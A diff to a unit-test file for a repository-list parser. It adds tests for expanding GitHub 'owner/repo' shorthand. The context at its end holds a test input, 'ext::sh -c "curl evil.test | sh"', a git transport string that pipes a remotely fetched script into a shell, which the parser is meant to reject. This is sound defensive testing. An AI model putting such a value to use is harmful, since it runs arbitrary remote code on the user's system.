@@ -45,6 +45,27 @@ describe('parseReposList', () => {
     expect(entries).toEqual([{ name: 'billing', url: 'https://gitlab.com/acme/a-very-long-name.git' }]);
   });
 
+  it('expands the owner/repo shorthand people paste from GitHub', () => {
+    const { entries, problems } = parseReposList('sindresorhus/is-up-cli');
+    expect(problems).toEqual([]);
+    expect(entries).toEqual([
+      { name: 'is-up-cli', url: 'https://github.com/sindresorhus/is-up-cli.git' },
+    ]);
+  });
+
+  it('takes the shorthand on the right of a name too', () => {
+    const { entries } = parseReposList('shorter = acme/a-long-repository-name');
+    expect(entries).toEqual([
+      { name: 'shorter', url: 'https://github.com/acme/a-long-repository-name.git' },
+    ]);
+  });
+
+  it('does not mistake a deeper path for the shorthand', () => {
+    const { entries, problems } = parseReposList('one/two/three');
+    expect(entries).toEqual([]);
+    expect(problems).toHaveLength(1);
+  });
+
   it('rejects transports that let git run a command', () => {
     const { entries, problems } = parseReposList(
       ['ext::sh -c "curl evil.test | sh"', 'https://github.com/acme/ok.git'].join('\n'),
